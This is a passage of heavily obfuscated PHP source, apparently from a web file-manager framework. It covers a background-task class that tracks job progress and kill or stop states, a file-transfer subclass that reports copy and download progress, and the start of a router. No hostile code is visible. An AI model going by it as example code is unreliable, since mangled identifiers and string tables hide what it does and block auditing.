"\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($çõ€î·‹, $÷İäƒĞ¢ = '', $¦îİ²öÊ = 0, $¯úå’¡â = '') { $¡ğíÁ—Ô =& $_SERVER[³à¼î¯á]; if (self::get($çõ€î·‹)) { return; } $this->task = array($¡ğíÁ—Ô[450] => $çõ€î·‹, $¡ğíÁ—Ô[1753] => USER_ID, $¡ğíÁ—Ô[1643] => $¯úå’¡â, $¡ğíÁ—Ô[501] => $¡ğíÁ—Ô[12], $¡ğíÁ—Ô[33] => $÷İäƒĞ¢, $¡ğíÁ—Ô[1115] => $¡ğíÁ—Ô[12], $¡ğíÁ—Ô[1113] => $¦îİ²öÊ, $¡ğíÁ—Ô[1754] => 0, $¡ğíÁ—Ô[1755] => 0, $¡ğíÁ—Ô[1756] => 0, $¡ğíÁ—Ô[1757] => timeFloat(), $¡ğíÁ—Ô[1758] => 0, $¡ğíÁ—Ô[1759] => 0, $¡ğíÁ—Ô[1760] => 0, $¡ğíÁ—Ô[1761] => 0, $¡ğíÁ—Ô[795] => $¡ğíÁ—Ô[1703]); $GLOBALS[$¡ğíÁ—Ô[1762]] = 1; Hook::bind($¡ğíÁ—Ô[1707], array($this, $¡ğíÁ—Ô[1763])); Hook::bind($¡ğíÁ—Ô[1764], array($this, $¡ğíÁ—Ô[1765])); $this->startAfter(); Hook::trigger($¡ğíÁ—Ô[1766], $this->task); $this->task[$¡ğíÁ—Ô[1759]] = timeFloat(); } public function end($ÛÅÑ€¤ö = '') { $æŒ‚ûşò =& $_SERVER[³à¼î¯á]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$æŒ‚ûşò[1759]]) { self::valueSet($this->task[$æŒ‚ûşò[450]], !1); } $this->isEnd = !0; if ($ÛÅÑ€¤ö) { $this->task[$æŒ‚ûşò[501]] = $ÛÅÑ€¤ö; } self::log($æŒ‚ûşò[1767] . $this->task[$æŒ‚ûşò[450]] . $æŒ‚ûşò[1768] . sprintf($æŒ‚ûşò[895], timeFloat() - $this->task[$æŒ‚ûşò[1757]]) . $æŒ‚ûşò[1769]); Hook::unbind($æŒ‚ûşò[1707], array($this, $æŒ‚ûşò[1763])); Hook::unbind($æŒ‚ûşò[1764], array($this, $æŒ‚ûşò[1765])); $this->endAfter(); $ºæƒ’ş = $this->task; $this->task = !1; Hook::trigger($æŒ‚ûşò[1770], $ºæƒ’ş); } public function update($¨ÍÔ—¥Ñ = 0, $Öõœğë¶ = false) { $ £±¡µ =& $_SERVER[³à¼î¯á]; $ƒéİÉâ =& $this->task; if (!$ƒéİÉâ) { return; } $ƒéİÉâ[$ £±¡µ[1754]] += $¨ÍÔ—¥Ñ; $ƒéİÉâ[$ £±¡µ[1758]] = timeFloat(); if ($ƒéİÉâ[$ £±¡µ[1113]]) { if ($ƒéİÉâ[$ £±¡µ[1113]] < $ƒéİÉâ[$ £±¡µ[1754]]) { $ƒéİÉâ[$ £±¡µ[1113]] = $ƒéİÉâ[$ £±¡µ[1754]]; } $î­ğ³ª = timeFloat() - $ƒéİÉâ[$ £±¡µ[1757]] - $ƒéİÉâ[$ £±¡µ[1760]]; if ($î­ğ³ª <= 0) { $î­ğ³ª = 0.001; } $ƒéİÉâ[$ £±¡µ[1755]] = $ƒéİÉâ[$ £±¡µ[1754]] / $ƒéİÉâ[$ £±¡µ[1113]]; $ƒéİÉâ[$ £±¡µ[1756]] = $ƒéİÉâ[$ £±¡µ[1754]] / $î­ğ³ª; if ($ƒéİÉâ[$ £±¡µ[1755]] > 0) { $ƒéİÉâ[$ £±¡µ[1761]] = $î­ğ³ª * (1 - $ƒéİÉâ[$ £±¡µ[1755]]) / $ƒéİÉâ[$ £±¡µ[1755]]; } $ƒéİÉâ[$ £±¡µ[1761]] = $ƒéİÉâ[$ £±¡µ[1761]] <= 0 ? 0 : $ƒéİÉâ[$ £±¡µ[1761]]; } $this->updateAfter(); $æÉäåŒ = 0.2; if (timeFloat() - $ƒéİÉâ[$ £±¡µ[1759]] < $æÉäåŒ && !$Öõœğë¶) { return; } $†¶ÁË¶Œ = self::get($ƒéİÉâ[$ £±¡µ[450]]); $™õíùª = $†¶ÁË¶Œ[$ £±¡µ[795]]; if ($™õíùª == self::STATYS_KILL) { $ôØü„¹é = array($ £±¡µ[1771] => LNG($ £±¡µ[1772]), $ £±¡µ[1266] => !1); Cache::set($ £±¡µ[1773] . $this->task[$ £±¡µ[450]], $ôØü„¹é, 30); $this->onKill(); $this->end(); die; } else { if ($™õíùª == self::STATYS_STOP) { $«€¼®¹ = 2; $†¶ÁË¶Œ[$ £±¡µ[1760]] += $«€¼®¹; self::valueSet($ƒéİÉâ[$ £±¡µ[450]], $†¶ÁË¶Œ); sleep($«€¼®¹); $this->update(); return; } } $ƒéİÉâ[$ £±¡µ[795]] = $™õíùª ? $™õíùª : $ƒéİÉâ[$ £±¡µ[795]]; $ƒéİÉâ[$ £±¡µ[1760]] = $†¶ÁË¶Œ[$ £±¡µ[1760]] ? $†¶ÁË¶Œ[$ £±¡µ[1760]] : 0; $ƒéİÉâ[$ £±¡µ[1759]] = timeFloat(); Hook::trigger($ £±¡µ[1774], $ƒéİÉâ); self::valueSet($ƒéİÉâ[$ £±¡µ[450]], $ƒéİÉâ); } public function onKillSet($ˆ÷Áõ©, $”‰àÀŞÊ = array()) { $this->onKillCall = array($ˆ÷Áõ©, $”‰àÀŞÊ); } public function onKill() { $Ç”“ğÍ… =& $_SERVER[³à¼î¯á]; self::log($Ç”“ğÍ…[1767] . $this->task[$Ç”“ğÍ…[450]] . $Ç”“ğÍ…[1775]); Hook::trigger($Ç”“ğÍ…[1776], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($•„ÆšË±) { $¡™œâ³Å =& $_SERVER[³à¼î¯á]; Cache::set($¡™œâ³Å[1773] . $this->task[$¡™œâ³Å[450]], $•„ÆšË±, 60); return $•„ÆšË±; } public static function get($ëÇÏ‰•½) { $Ã¤‘¾Ù° =& $_SERVER[³à¼î¯á]; $ÕÓŠÃ·¹ = self::valueGet($ëÇÏ‰•½); if (is_array($ÕÓŠÃ·¹) && $ÕÓŠÃ·¹[$Ã¤‘¾Ù°[1777]]) { $Ãë š£ù = ActionApply($ÕÓŠÃ·¹[$Ã¤‘¾Ù°[1777]], array($ÕÓŠÃ·¹)); $ÕÓŠÃ·¹ = is_array($Ãë š£ù) ? $Ãë š£ù : $ÕÓŠÃ·¹; } return $ÕÓŠÃ·¹; } public static function listData() { $ù²ÆÄá = self::valueGet(); return array_sort_by($ù²ÆÄá, $_SERVER[³à¼î¯á][1757], !0); } public static function kill($ó¢ñ·Èë) { return self::changeStatus($ó¢ñ·Èë, self::STATYS_KILL); } public static function stop($ûÙª¶Ëà) { return self::changeStatus($ûÙª¶Ëà, self::STATYS_STOP); } public static function restart($†û˜º…¿) { return self::changeStatus($†û˜º…¿, self::STATYS_RUNNING); } public static function killAll() { $Úå£æŠ =& $_SERVER[³à¼î¯á]; $½»µúö± = self::listData(); foreach ($½»µúö± as $›¢¸®Ç) { self::kill($›¢¸®Ç[$Úå£æŠ[450]]); } sleep(2); foreach ($½»µúö± as $›¢¸®Ç) { self::valueSet($›¢¸®Ç[$Úå£æŠ[450]], !1); } } private static function changeStatus($–Á‹Ÿ·ç, $¸¢£áÏô) { $ö‚¥¬Â =& $_SERVER[³à¼î¯á]; $·Ìö¸ = self::valueGet($–Á‹Ÿ·ç); if (!$·Ìö¸) { return !1; } $·Ìö¸[$ö‚¥¬Â[795]] = $¸¢£áÏô; self::valueSet($–Á‹Ÿ·ç, $·Ìö¸); self::log($ö‚¥¬Â[1778] . $·Ìö¸[$ö‚¥¬Â[450]] . $ö‚¥¬Â[1779] . $¸¢£áÏô); return !0; } public static function valueGet($—´û½—î = false) { $¼ì•›Æº =& $_SERVER[³à¼î¯á]; if ($—´û½—î) { $´ì¼¿Ìİ = Model($¼ì•›Æº[495])->where(array($¼ì•›Æº[97] => $—´û½—î, $¼ì•›Æº[33] => $¼ì•›Æº[1122]))->find(); return $´ì¼¿Ìİ ? json_decode($´ì¼¿Ìİ[$¼ì•›Æº[425]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($×ìÇóæ¬ = false) { $ş©¢ÕÊ =& $_SERVER[³à¼î¯á]; $ûáÇÉ¿ç = array($ş©¢ÕÊ[33] => $ş©¢ÕÊ[1122]); if ($×ìÇóæ¬) { $ûáÇÉ¿ç[$ş©¢ÕÊ[1753]] = $×ìÇóæ¬; } $Ÿ«ÁÌ°Æ = Model($ş©¢ÕÊ[495])->where($ûáÇÉ¿ç)->select(); $Ÿ«ÁÌ°Æ = $Ÿ«ÁÌ°Æ ? $Ÿ«ÁÌ°Æ : array(); foreach ($Ÿ«ÁÌ°Æ as $‹Õßã¨Ş => $Çè…Œ¡Ü) { $Ÿ«ÁÌ°Æ[$‹Õßã¨Ş] = json_decode($Çè…Œ¡Ü[$ş©¢ÕÊ[425]], !0); } return $Ÿ«ÁÌ°Æ; } public static function valueSet($ÁÀÍ¢Ÿ„, $Î„¯ëÅó) { $¥ß–‹ë¸ =& $_SERVER[³à¼î¯á]; if (!$Î„¯ëÅó) { return Model($¥ß–‹ë¸[495])->where(array($¥ß–‹ë¸[97] => $ÁÀÍ¢Ÿ„, $¥ß–‹ë¸[33] => $¥ß–‹ë¸[1122]))->delete(); } $Ë¤Úúöˆ = json_encode($Î„¯ëÅó); if (!$Ë¤Úúöˆ) { ob_start(); var_dump($Î„¯ëÅó); $Ò¸¨êàš = ob_get_clean(); self::log($¥ß–‹ë¸[1780] . json_encode_force($Ò¸¨êàš)); } if (!$ÁÀÍ¢Ÿ„ || !$Î„¯ëÅó[$¥ß–‹ë¸[450]]) { return !1; } $ÆŠ¥£†ê = array($¥ß–‹ë¸[33] => $¥ß–‹ë¸[1122], $¥ß–‹ë¸[1753] => USER_ID, $¥ß–‹ë¸[97] => $ÁÀÍ¢Ÿ„, $¥ß–‹ë¸[425] => $Ë¤Úúöˆ); $§ÕûôŞ = $¥ß–‹ë¸[1781]; CacheLock::lock($§ÕûôŞ); Model($¥ß–‹ë¸[495])->add($ÆŠ¥£†ê, array(), !0); CacheLock::unlock($§ÕûôŞ); } public static function log($êæ¨Ÿ) { if (!GLOBAL_DEBUG) { return; } write_log($êæ¨Ÿ, $_SERVER[³à¼î¯á][1782]); } } class TaskFileTransfer extends Task { protected function startAfter() { $…û¿ŠÀ =& $_SERVER[³à¼î¯á]; $£ôÇâ–Ğ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($…û¿ŠÀ[1783], array($this, $…û¿ŠÀ[1784])); Hook::bind($…û¿ŠÀ[1277], array($this, $…û¿ŠÀ[1785])); Hook::bind($…û¿ŠÀ[1786], array($this, $…û¿ŠÀ[1787])); Hook::bind($…û¿ŠÀ[643], array($this, $…û¿ŠÀ[1788])); Hook::bind($…û¿ŠÀ[644], array($this, $…û¿ŠÀ[1789])); Hook::bind($…û¿ŠÀ[650], array($this, $…û¿ŠÀ[1790])); Hook::bind($…û¿ŠÀ[651], array($this, $…û¿ŠÀ[1791])); Hook::bind($…û¿ŠÀ[646], array($this, $…û¿ŠÀ[1792])); Hook::bind($…û¿ŠÀ[648], array($this, $…û¿ŠÀ[1793])); Hook::bind($…û¿ŠÀ[612], array($this, $…û¿ŠÀ[1794])); Hook::bind($…û¿ŠÀ[609], array($this, $…û¿ŠÀ[1794])); Hook::bind($…û¿ŠÀ[614], array($this, $…û¿ŠÀ[1794])); Hook::bind($…û¿ŠÀ[616], array($this, $…û¿ŠÀ[1794])); Hook::bind($…û¿ŠÀ[618], array($this, $…û¿ŠÀ[1794])); Hook::bind($…û¿ŠÀ[1795], array($this, $…û¿ŠÀ[1796])); Hook::bind($…û¿ŠÀ[634], array($this, $…û¿ŠÀ[1797])); $this->sourceModelCopyFlag = !1; Hook::bind($…û¿ŠÀ[1798], array($this, $…û¿ŠÀ[1799])); Hook::bind($…û¿ŠÀ[1800], array($this, $…û¿ŠÀ[1801])); Hook::bind($…û¿ŠÀ[1802], array($this, $…û¿ŠÀ[1803])); $£ôÇâ–Ğ[$…û¿ŠÀ[1804]] = LNG($…û¿ŠÀ[1805]); $£ôÇâ–Ğ[$…û¿ŠÀ[1806]] = 0; $£ôÇâ–Ğ[$…û¿ŠÀ[1807]] = 0; $£ôÇâ–Ğ[$…û¿ŠÀ[1115]] = $…û¿ŠÀ[12]; $£ôÇâ–Ğ[$…û¿ŠÀ[1808]] = $…û¿ŠÀ[12]; $£ôÇâ–Ğ[$…û¿ŠÀ[1809]] = 0; $£ôÇâ–Ğ[$…û¿ŠÀ[1810]] = 0; $£ôÇâ–Ğ[$…û¿ŠÀ[1811]] = 0; if (!$£ôÇâ–Ğ[$…û¿ŠÀ[1643]]) { $£ôÇâ–Ğ[$…û¿ŠÀ[1643]] = LNG($…û¿ŠÀ[1812]); } } protected function endAfter() { $Ñ£ãÄ¢ =& $_SERVER[³à¼î¯á]; Hook::unbind($Ñ£ãÄ¢[1783], array($this, $Ñ£ãÄ¢[1784])); Hook::unbind($Ñ£ãÄ¢[1277], array($this, $Ñ£ãÄ¢[1785])); Hook::unbind($Ñ£ãÄ¢[1786], array($this, $Ñ£ãÄ¢[1787])); Hook::unbind($Ñ£ãÄ¢[643], array($this, $Ñ£ãÄ¢[1788])); Hook::unbind($Ñ£ãÄ¢[644], array($this, $Ñ£ãÄ¢[1789])); Hook::unbind($Ñ£ãÄ¢[650], array($this, $Ñ£ãÄ¢[1790])); Hook::unbind($Ñ£ãÄ¢[651], array($this, $Ñ£ãÄ¢[1791])); Hook::unbind($Ñ£ãÄ¢[646], array($this, $Ñ£ãÄ¢[1792])); Hook::unbind($Ñ£ãÄ¢[648], array($this, $Ñ£ãÄ¢[1793])); Hook::unbind($Ñ£ãÄ¢[612], array($this, $Ñ£ãÄ¢[1794])); Hook::unbind($Ñ£ãÄ¢[609], array($this, $Ñ£ãÄ¢[1794])); Hook::unbind($Ñ£ãÄ¢[614], array($this, $Ñ£ãÄ¢[1794])); Hook::unbind($Ñ£ãÄ¢[616], array($this, $Ñ£ãÄ¢[1794])); Hook::unbind($Ñ£ãÄ¢[618], array($this, $Ñ£ãÄ¢[1794])); Hook::unbind($Ñ£ãÄ¢[1795], array($this, $Ñ£ãÄ¢[1796])); Hook::unbind($Ñ£ãÄ¢[634], array($this, $Ñ£ãÄ¢[1797])); Hook::unbind($Ñ£ãÄ¢[1798], array($this, $Ñ£ãÄ¢[1799])); Hook::unbind($Ñ£ãÄ¢[1800], array($this, $Ñ£ãÄ¢[1801])); Hook::unbind($Ñ£ãÄ¢[1802], array($this, $Ñ£ãÄ¢[1803])); } public function copyMoveStart($Ù…áÓ», $¿¼»ëÚÓ, $ğÜ¥Ç´, $ëÖğí²) { $´ùı©€« =& $_SERVER[³à¼î¯á]; self::log($´ùı©€«[1813] . $¿¼»ëÚÓ . $´ùı©€«[73] . $ëÖğí²); $™ë“ù„Š = rtrim(TEMP_FILES, $´ùı©€«[8]); if (substr($¿¼»ëÚÓ, 0, strlen($™ë“ù„Š)) == $™ë“ù„Š) { return; } if (substr($ëÖğí², 0, strlen($™ë“ù„Š)) == $™ë“ù„Š) { return; } $„¨‚«˜ =& $this->task; $„¨‚«˜[$´ùı©€«[1814]] = KodIO::transferType($Ù…áÓ», $ğÜ¥Ç´); $this->update(); } public function updateAfter() { $û´ŞÕ½ =& $_SERVER[³à¼î¯á]; $™œµä‰ã =& $this->task; if (!$™œµä‰ã[$û´ŞÕ½[808]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($™œµä‰ã[$û´ŞÕ½[1814]] == $û´ŞÕ½[1369]) { return; } self::updateTask($™œµä‰ã); } private static function updateTask(&$É€ù¾îß) { $îêˆÊäè =& $_SERVER[³à¼î¯á]; if ($É€ù¾îß[$îêˆÊäè[1814]] == $îêˆÊäè[1248] || $É€ù¾îß[$îêˆÊäè[1814]] == $îêˆÊäè[110]) { if ($É€ù¾îß[$îêˆÊäè[1808]]) { $É€ù¾îß[$îêˆÊäè[1811]] = $É€ù¾îß[$îêˆÊäè[1810]] + $É€ù¾îß[$îêˆÊäè[1807]]; } } else { if ($É€ù¾îß[$îêˆÊäè[1814]] == $îêˆÊäè[1370]) { if ($É€ù¾îß[$îêˆÊäè[1808]] == $îêˆÊäè[1248]) { $É€ù¾îß[$îêˆÊäè[1811]] = $É€ù¾îß[$îêˆÊäè[1810]] + $É€ù¾îß[$îêˆÊäè[1807]] * 0.5; } else { if ($É€ù¾îß[$îêˆÊäè[1808]] == $îêˆÊäè[110]) { $É€ù¾îß[$îêˆÊäè[1811]] = $É€ù¾îß[$îêˆÊäè[1810]] + $É€ù¾îß[$îêˆÊäè[1806]] * 0.5 + $É€ù¾îß[$îêˆÊäè[1807]] * 0.5; } } } } $É€ù¾îß[$îêˆÊäè[1755]] = $É€ù¾îß[$îêˆÊäè[1811]] / $É€ù¾îß[$îêˆÊäè[808]]; if ($É€ù¾îß[$îêˆÊäè[1755]] > 0) { $ñÆã‚©ø = timeFloat() - $É€ù¾îß[$îêˆÊäè[1757]] - $É€ù¾îß[$îêˆÊäè[1760]]; $É€ù¾îß[$îêˆÊäè[1761]] = $ñÆã‚©ø * (1 - $É€ù¾îß[$îêˆÊäè[1755]]) / $É€ù¾îß[$îêˆÊäè[1755]]; } } public function addPath($»˜ƒŞ—) { $ª‚šÉ¢Ä =& $_SERVER[³à¼î¯á]; if (!$»˜ƒŞ—) { return; } $ÑÈÒó€ =& $this->task; $åÇÆ–ŸÆ = IO::infoWithChildren($»˜ƒŞ—); $÷õ£ÜË£ = $ÑÈÒó€[$ª‚šÉ¢Ä[1815]] ? $ÑÈÒó€[$ª‚šÉ¢Ä[1815]][$ª‚šÉ¢Ä[1816]] : 0; $ÑÈÒó€[$ª‚šÉ¢Ä[1815]] = array($ª‚šÉ¢Ä[1816] => $÷õ£ÜË£ + 1, $ª‚šÉ¢Ä[469] => $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[32]], $ª‚šÉ¢Ä[87] => $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[87]], $ª‚šÉ¢Ä[558] => $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[558]] ? $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[558]] : $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[87]]); if ($åÇÆ–ŸÆ[$ª‚šÉ¢Ä[33]] == $ª‚šÉ¢Ä[221]) { $ÑÈÒó€[$ª‚šÉ¢Ä[1113]] += 1; } else { $ÑÈÒó€[$ª‚šÉ¢Ä[1113]] += $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[82]][$ª‚šÉ¢Ä[80]]; if ($åÇÆ–ŸÆ[$ª‚šÉ¢Ä[184]]) { $ÑÈÒó€[$ª‚šÉ¢Ä[1113]] += $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[82]][$ª‚šÉ¢Ä[81]] + 1; } } $ÑÈÒó€[$ª‚šÉ¢Ä[808]] += $åÇÆ–ŸÆ[$ª‚šÉ¢Ä[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÓÏ‡çèÂ) { } public function sourceAddHashEnd($İÕö„ß) { } public function sourceAddFileStart($´ãààÏ¨) { $‡á· × =& $_SERVER[³à¼î¯á]; $óé´±§¯ =& $this->task; $óé´±§¯[$‡á· ×[1806]] = $´ãààÏ¨[$‡á· ×[79]]; $óé´±§¯[$‡á· ×[1804]] = $´ãààÏ¨[$‡á· ×[32]]; $óé´±§¯[$‡á· ×[1115]] = $´ãààÏ¨[$‡á· ×[32]]; $óé´±§¯[$‡á· ×[1817]] = $´ãààÏ¨[$‡á· ×[87]]; $this->update(); } public function sourceAddFileEnd($Œı£Ô¢Î) { $´¬Æ‰èø =& $_SERVER[³à¼î¯á]; $¥íÌ«õ‡ =& $this->task; $¥íÌ«õ‡[$´¬Æ‰èø[1811]] += $Œı£Ô¢Î[$´¬Æ‰èø[79]]; $¥íÌ«õ‡[$´¬Æ‰èø[1817]] = $Œı£Ô¢Î[$´¬Æ‰èø[87]]; $this->update(1); } public function copyFileStart($‘“»ô­©, $ËğÊã, $àöâ‰‹, $Â ÎÆ±Æ, $Û•·á£š, $â€ôö‡) { $şµ¶´¦  =& $_SERVER[³à¼î¯á]; $üÚàÂ‹Œ = $Û•·á£š; if ($üÚàÂ‹Œ == $GLOBALS[$şµ¶´¦ [1818]]) { $üÚàÂ‹Œ = $GLOBALS[$şµ¶´¦ [1819]]; } $GLOBALS[$şµ¶´¦ [1819]] = $Û•·á£š; $GLOBALS[$şµ¶´¦ [1818]] = $â€ôö‡; $äò§Â =& $this->task; $äò§Â[$şµ¶´¦ [1804]] = $üÚàÂ‹Œ; $äò§Â[$şµ¶´¦ [1806]] = (int) $‘“»ô­©->size($ËğÊã); $äò§Â[$şµ¶´¦ [1807]] = 0; $äò§Â[$şµ¶´¦ [1115]] = $şµ¶´¦ [12]; $äò§Â[$şµ¶´¦ [1808]] = $şµ¶´¦ [12]; $äò§Â[$şµ¶´¦ [1809]] = 0; $ëĞÓŞ˜ = $äò§Â[$şµ¶´¦ [1806]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($äò§Â[$şµ¶´¦ [450]] . $şµ¶´¦ [1820]); if ($ëĞÓŞ˜ && file_exists(get_path_father($Â ÎÆ±Æ))) { Cache::set($äò§Â[$şµ¶´¦ [450]] . $şµ¶´¦ [1820], $Â ÎÆ±Æ); $äò§Â[$şµ¶´¦ [1777]] = array($şµ¶´¦ [1821], $şµ¶´¦ [1822]); } $this->update(0, $ëĞÓŞ˜); } public static function updateCopyLocalFileSize($†¡›í) { $Û‚ˆ§óè =& $_SERVER[³à¼î¯á]; $é—”ğÎ™ = Cache::get($†¡›í[$Û‚ˆ§óè[450]] . $Û‚ˆ§óè[1820]); if (!$é—”ğÎ™ || !file_exists($é—”ğÎ™)) { return $†¡›í; } $†¡›í[$Û‚ˆ§óè[1807]] = @filesize($é—”ğÎ™); $†¡›í[$Û‚ˆ§óè[1811]] += $†¡›í[$Û‚ˆ§óè[1807]]; self::updateTask($†¡›í); return $†¡›í; } public function copyFileEnd($Äâòè¹ú, $ÚÌÜº«, $¢¹ëÒØì, $ŒÁì‹±, $°ş¤úù‰, $øÕªİ°) { $®š•áèÖ =& $_SERVER[³à¼î¯á]; $ãÃ®œ’ö =& $this->task; $ãÃ®œ’ö[$®š•áèÖ[1807]] = $ãÃ®œ’ö[$®š•áèÖ[1806]]; $ãÃ®œ’ö[$®š•áèÖ[1808]] = $®š•áèÖ[12]; unset($ãÃ®œ’ö[$®š•áèÖ[1777]]); if ($°ş¤úù‰ == $ãÃ®œ’ö[$®š•áèÖ[1804]]) { $ãÃ®œ’ö[$®š•áèÖ[1810]] += $ãÃ®œ’ö[$®š•áèÖ[1806]]; $ãÃ®œ’ö[$®š•áèÖ[1811]] = $ãÃ®œ’ö[$®š•áèÖ[1810]]; $ãúâÒµ = 1; if (isset($ãÃ®œ’ö[$®š•áèÖ[1817]]) && $ãÃ®œ’ö[$®š•áèÖ[1817]] == $ÚÌÜº«) { $ãúâÒµ = 0; } $this->update($ãúâÒµ); } else { $this->update(); $ãÃ®œ’ö[$®š•áèÖ[1807]] = 0; } Cache::remove($ãÃ®œ’ö[$®š•áèÖ[450]] . $®š•áèÖ[1820]); self::log($®š•áèÖ[1823] . $ÚÌÜº« . $®š•áèÖ[73] . $ŒÁì‹± . $®š•áèÖ[253] . $°ş¤úù‰ . $®š•áèÖ[1824] . $ãÃ®œ’ö[$®š•áèÖ[1804]]); } public function updateFileEnd($¸í¥ç†‹, $ÙûÎİ÷£) { $¶¯²òÖ¸ =& $_SERVER[³à¼î¯á]; $¯Ê›Ö›‚ =& $this->task; $¯Ê›Ö›‚[$¶¯²òÖ¸[1804]] = $¸í¥ç†‹; $¯Ê›Ö›‚[$¶¯²òÖ¸[1806]] = $ÙûÎİ÷£; $¯Ê›Ö›‚[$¶¯²òÖ¸[1810]] += $ÙûÎİ÷£; $¯Ê›Ö›‚[$¶¯²òÖ¸[1811]] = $¯Ê›Ö›‚[$¶¯²òÖ¸[1810]]; $this->update(1); self::log($¶¯²òÖ¸[1825] . $¸í¥ç†‹); } public function sourceModelCopy($©Ç¥ˆôë) { $¨¸üÉäè =& $_SERVER[³à¼î¯á]; $‚¹É´…Ù = $©Ç¥ˆôë[0]; $­ÅùËı = $©Ç¥ˆôë[1]; $üœœçèÍ =& $this->task; $this->sourceModelCopyFlag = !0; $Ÿê¨¡Ú  = 0; switch ($‚¹É´…Ù) { case $¨¸üÉäè[610]: $Ÿê¨¡Ú  = 1; break; case $¨¸üÉäè[613]: $üœœçèÍ[$¨¸üÉäè[1804]] = $­ÅùËı[$¨¸üÉäè[32]]; break; case $¨¸üÉäè[615]: $Ÿê¨¡Ú  = intval($©Ç¥ˆôë[$¨¸üÉäè[431]] * 0.4); break; case $¨¸üÉäè[617]: $Ÿê¨¡Ú  = intval($©Ç¥ˆôë[$¨¸üÉäè[431]] * 0.2); break; case $¨¸üÉäè[619]: $Ÿê¨¡Ú  = intval($©Ç¥ˆôë[$¨¸üÉäè[431]] * 0.4); break; } $this->update($Ÿê¨¡Ú ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($€ÇŞ’…Ê, $†²ºá·ª) { $ÌÖÛíü =& $_SERVER[³à¼î¯á]; $this->sourceModelCopyFlag = !0; $ÛÓÜöâ™ = 1; if (isset($€ÇŞ’…Ê[$ÌÖÛíü[82]])) { $ÛÓÜöâ™ = $€ÇŞ’…Ê[$ÌÖÛíü[82]][$ÌÖÛíü[80]]; $ÛÓÜöâ™ = $ÛÓÜöâ™ + $€ÇŞ’…Ê[$ÌÖÛíü[82]][$ÌÖÛíü[81]] + 1; } $this->update($ÛÓÜöâ™); $this->sourceModelCopyFlag = !1; } public function sourceMove($ıŠ“­ÌÀ) { $this->sourceRemove($ıŠ“­ÌÀ, !1); } public function curlProgress($öÙ¿¼ä», $Ø¶ŒÔÔ, $ÛÄ÷çæ”, $Ô‘ı—Ü–, $ƒÕºÂ‹) { $‚©ÍˆûÕ =& $_SERVER[³à¼î¯á]; $ûïÑÊĞ² =& $this->task; if ($ƒÕºÂ‹ > 0) { $ûïÑÊĞ²[$‚©ÍˆûÕ[1115]] = $‚©ÍˆûÕ[1826]; $ûïÑÊĞ²[$‚©ÍˆûÕ[1808]] = $‚©ÍˆûÕ[110]; if ($ûïÑÊĞ²[$‚©ÍˆûÕ[1806]]) { $ûïÑÊĞ²[$‚©ÍˆûÕ[1807]] = $ƒÕºÂ‹; } if ($ûïÑÊĞ²[$‚©ÍˆûÕ[1809]]) { $ûïÑÊĞ²[$‚©ÍˆûÕ[1807]] = $ƒÕºÂ‹ + $ûïÑÊĞ²[$‚©ÍˆûÕ[1809]]; } } else { if ($ÛÄ÷çæ” > 0) { if ($ûïÑÊĞ²[$‚©ÍˆûÕ[1806]] == $Ø¶ŒÔÔ) { $ûïÑÊĞ²[$‚©ÍˆûÕ[1807]] = $ÛÄ÷çæ”; $ûïÑÊĞ²[$‚©ÍˆûÕ[1115]] = $‚©ÍˆûÕ[1827]; $ûïÑÊĞ²[$‚©ÍˆûÕ[1808]] = $‚©ÍˆûÕ[1248]; } } } $this->update(); } public function curlProgressStart($áô…©‘Õ) { } public function curlProgressEnd($ëëüêæ) { $ëèŠŸıš =& $_SERVER[³à¼î¯á]; $åœÀ‡ù =& $this->task; $Ÿ¤ùÏšÒ = curl_getinfo($ëëüêæ); $†×Ïçæñ = $Ÿ¤ùÏšÒ[$ëèŠŸıš[1828]]; if ($†×Ïçæñ == -1) { $†×Ïçæñ = $Ÿ¤ùÏšÒ[$ëèŠŸıš[1829]]; } if ($åœÀ‡ù[$ëèŠŸıš[1808]] == $ëèŠŸıš[110] && $†×Ïçæñ) { $åœÀ‡ù[$ëèŠŸıš[1809]] += $†×Ïçæñ; } $this->update(); } } goto bíÊæ•Œİˆ; E¼¿›İŞ™˜: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\x5b\136\x2f\135\x2b", "\x3a\x6e\165\x6d" => "\x5b\60\55\71\135\x2b", "\72\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($“À‹ÄÊì, $Ùë§º«) { $¾îÕÂ =& $_SERVER[³à¼î¯á]; if ($“À‹ÄÊì == $¾îÕÂ[1689]) { $’ú„÷î½ = array_map($¾îÕÂ[1690], $Ùë§º«[0]); $¶äÉúƒ´ = strpos($Ùë§º«[1], $¾îÕÂ[8]) === 0 ? $Ùë§º«[1] : $¾îÕÂ[8] . $Ùë§º«[1]; $±±¼ƒ¼ = $Ùë§º«[2]; } else { $’ú„÷î½ = null; $¶äÉúƒ´ = strpos($Ùë§º«[0], $¾îÕÂ[8]) === 0 ? $Ùë§º«[0] : $¾îÕÂ[8] . $Ùë§º«[0]; $±±¼ƒ¼ = $Ùë§º«[1]; } array_push(self::$maps, $’ú„÷î½); array_push(self::$routes, $¶äÉúƒ´); array_push(self::$methods, strtoupper($“À‹ÄÊì)); array_push(self::$callbacks, $±±¼ƒ¼); } public static function error($û¸íÀÈ•) { self::$errorCallback = $û¸íÀÈ•; } public static function haltOnMatch($¶ÀôÕ² = true) { self::$halts = $¶ÀôÕ²; } public static function dispatch() { $äı–¿İË =& 